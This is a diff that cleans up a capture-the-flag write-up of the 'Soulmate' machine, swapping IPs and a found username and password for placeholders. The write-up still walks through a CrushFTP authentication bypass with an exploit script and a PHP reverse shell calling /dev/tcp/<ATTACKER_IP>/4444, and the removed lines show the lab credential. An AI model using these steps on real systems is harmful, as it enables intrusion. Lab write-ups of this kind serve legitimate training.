@@ -5,7 +5,6 @@
 **Machine:** Soulmate  
 **Difficulty:** Easy  
 **OS:** Linux  
-**IP:** 10.10.11.86  
 **Release Date:** 2025-10-30  
 **Tags:** CrushFTP, Authentication Bypass, CVE-2025-31161, File Upload, Erlang SSH, Privilege Escalation
 
@@ -40,7 +39,7 @@ Web enumeration → CrushFTP auth bypass → File upload (PHP shell) → Erlang 
 Initial nmap scan to discover open services:
 
 ```bash
-nmap -sC -sV -oN nmap_initial.txt 10.10.11.86
+nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
 ```
 
 **Key Results:**
@@ -55,8 +54,8 @@ nmap -sC -sV -oN nmap_initial.txt 10.10.11.86
 Added hostname entries for easier navigation:
 
 ```bash
-echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
-echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
+echo "<TARGET_IP> soulmate.htb" | sudo tee -a /etc/hosts
+echo "<TARGET_IP> ftp.soulmate.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Virtual Host Discovery
@@ -64,7 +63,7 @@ echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
 Enumerated virtual hosts using ffuf:
 
 ```bash
-ffuf -u http://10.10.11.86/ -H 'Host: FUZZ.soulmate.htb' \
+ffuf -u http://<TARGET_IP>/ -H 'Host: FUZZ.soulmate.htb' \
   -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   -ac -t 50
 ```
@@ -115,7 +114,7 @@ python3 52295.py --target ftp.soulmate.htb --port 80 --exploit \
 ```bash
 cat > revshell.php << 'EOF'
 <?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.114/4444 0>&1'");
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
 ?>
 EOF
 ```
@@ -188,7 +187,7 @@ cat /usr/local/lib/erlang_login/start.escript
 **Found hardcoded credentials:**
 
 ```erlang
-{user_passwords, [{"ben", "HouseH0ldings998"}]}
+{user_passwords, [{"[USERNAME]", "[REDACTED_PASSWORD]"}]}
 ```
 
 ### SSH Access as User
@@ -196,8 +195,8 @@ cat /usr/local/lib/erlang_login/start.escript
 Authenticated via SSH using discovered credentials:
 
 ```bash
-ssh ben@10.10.11.86
-# Password: HouseH0ldings998
+ssh [USERNAME]@<TARGET_IP>
+# Password: [REDACTED_PASSWORD]
 ```
 
 **User Flag:**
@@ -228,8 +227,8 @@ No sudo privileges available for user `ben`.
 Connected to the Erlang SSH service running on localhost:
 
 ```bash
-ssh ben@127.0.0.1 -p 2222
-# Password: HouseH0ldings998
+ssh [USERNAME]@127.0.0.1 -p 2222
+# Password: [REDACTED_PASSWORD]
 ```
 
 This provided access to an Erlang shell:
